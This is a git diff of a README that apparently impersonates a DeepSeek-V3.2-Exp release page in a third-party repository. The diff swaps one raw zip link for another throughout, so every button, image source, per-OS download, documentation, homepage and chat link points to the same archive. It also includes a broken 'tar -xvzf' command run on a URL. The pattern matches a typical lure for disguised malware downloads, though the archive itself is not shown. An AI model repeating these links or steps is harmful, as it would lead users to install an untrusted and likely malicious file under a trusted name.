@@ -1,13 +1,13 @@
 # 🚀 DeepSeek-V3.2-Exp - Unlock Advanced Exploration Features
 
 <div align="center">
-  <a href="https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip">
-    <img src="https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip%20DeepSeek%20V3.2%20Exp-blue" alt="Download DeepSeek V3.2 Exp" />
+  <a href="https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip">
+    <img src="https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip%20DeepSeek%20V3.2%20Exp-blue" alt="Download DeepSeek V3.2 Exp" />
   </a>
 </div>
 
 <div align="center">
-  <img src="https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip" width="60%" alt="DeepSeek-V3" />
+  <img src="https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip" width="60%" alt="DeepSeek-V3" />
 </div>
 
 ---
@@ -30,8 +30,8 @@ To get started with DeepSeek-V3.2-Exp, follow these steps:
 1. **Visit the Download Page**  
    Click on the button below:  
    <div align="center">
-     <a href="https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip">
-       <img src="https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip%20DeepSeek%20V3.2%20Exp-blue" alt="Download DeepSeek V3.2 Exp" />
+     <a href="https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip">
+       <img src="https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip%20DeepSeek%20V3.2%20Exp-blue" alt="Download DeepSeek V3.2 Exp" />
      </a>
    </div>
 
@@ -51,16 +51,16 @@ To get started with DeepSeek-V3.2-Exp, follow these steps:
 
 To download and install DeepSeek-V3.2-Exp, please follow these steps carefully. 
 
-1. **Go to the Release Page**: Visit [this page](https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip) to find the latest version.
+1. **Go to the Release Page**: Visit [this page](https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip) to find the latest version.
    
 2. **Choose Your Operating System**: Click on the link that matches your OS:
-   - For Windows, click on `https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip`.
-   - For macOS, click on `https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip`.
-   - For Linux, download the `https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip`.
+   - For Windows, click on `https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip`.
+   - For macOS, click on `https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip`.
+   - For Linux, download the `https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip`.
 
 3. **Extract (if needed)**: For Linux users, after downloading, you may need to extract the files. Open your terminal and run:
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip
+   tar -xvzf https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip
    ```
 
 4. **Run the Application**:  
@@ -85,9 +85,9 @@ If you encounter issues, here are some tips:
 
 For further assistance and support, you can reach out through the following channels:
 
-- **Documentation**: Comprehensive user guide can be found on the [DeepSeek Documentation Page](https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip).
-- **Official Website**: Visit our [Homepage](https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip) for updates and features.
-- **Community Support**: Join discussions on our [Chat](https://raw.githubusercontent.com/arthur1258/DeepSeek-V3.2-Exp/main/exocarp/DeepSeek-V3.2-Exp.zip) platform.
+- **Documentation**: Comprehensive user guide can be found on the [DeepSeek Documentation Page](https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip).
+- **Official Website**: Visit our [Homepage](https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip) for updates and features.
+- **Community Support**: Join discussions on our [Chat](https://github.com/arthur1258/DeepSeek-V3.2-Exp/raw/refs/heads/main/inference/Exp_Seek_Deep_1.6.zip) platform.
 
 ## 📊 Features of DeepSeek-V3.2-Exp
 
